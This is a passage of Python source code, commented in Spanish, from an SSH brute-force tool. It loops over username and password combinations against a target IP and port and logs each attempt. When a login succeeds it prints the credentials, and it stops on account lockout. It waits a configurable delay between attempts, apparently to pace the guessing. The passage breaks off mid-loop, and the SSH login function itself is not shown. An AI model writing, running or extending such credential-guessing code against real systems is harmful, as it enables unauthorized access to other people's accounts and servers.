        print(f"[*] Contraseñas por usuario: {len(contraseñas)}")
        print(f"[*] Máximo de intentos: {max_intentos}")
        print(f"[*] Delay entre intentos: {delay} segundos ({delay/60:.1f} minutos)\n")
        
        # Generar combinaciones
        combinaciones = [
            (u, c) for u in usuarios for c in contraseñas
        ]
        
        inicio = datetime.now()
        
        # Iterar sobre combinaciones
        for usuario, contraseña in combinaciones:
            
            # Verificar límite de intentos
            if self.intentos_realizados >= max_intentos:
                print("[!] Límite de intentos alcanzado")
                break
            
            self.intentos_realizados += 1
            
            # Mostrar intento
            print(f"[*] Intento {self.intentos_realizados}/{max_intentos}: "
                  f"{usuario}:{contraseña}", end=" → ")
            
            # Intentar acceso
            resultado = self.intentar_acceso_ssh(ip, puerto, usuario, contraseña)
            
            # Registrar en historial
            self.historial.append({
                "intento": self.intentos_realizados,
                "usuario": usuario,
                "contraseña": contraseña,
                "resultado": resultado["estado"],
                "mensaje": resultado["mensaje"],
                "timestamp": datetime.now().isoformat()
            })
            
            # Procesar resultado
            if resultado["estado"] == "éxito":
                print("✓ ÉXITO")
                print(f"\n[+] ✓✓✓ ACCESO LOGRADO ✓✓✓")
                print(f"[+] Usuario: {usuario}")
                print(f"[+] Contraseña: {contraseña}")
                
                self.acceso_logrado = True
                self.credenciales_válidas = {
                    "usuario": usuario,
                    "contraseña": contraseña,
                    "ip": ip,
                    "puerto": puerto
                }
                
                break  # Detener si obtiene acceso
            
            elif resultado["estado"] == "falló":
                print("✗")
            
            elif resultado["estado"] == "cuenta_bloqueada":
                print("🔒 BLOQUEADA")
                print("[!] Cuenta bloqueada, deteniendo brute force")
                break
            
            else:
                print(f"⚠️ {resultado['estado']}")
            
            # Esperar delay ANTES del siguiente intento (excepto el último)
            if (self.intentos_realizados < max_intentos and 
                not self.acceso_logrado and 
                resultado["estado"] != "cuenta_bloqueada"):
                
                print(f"[⏱️] Esperando {delay}s ({delay/60:.1f} min) antes del siguiente...")
                
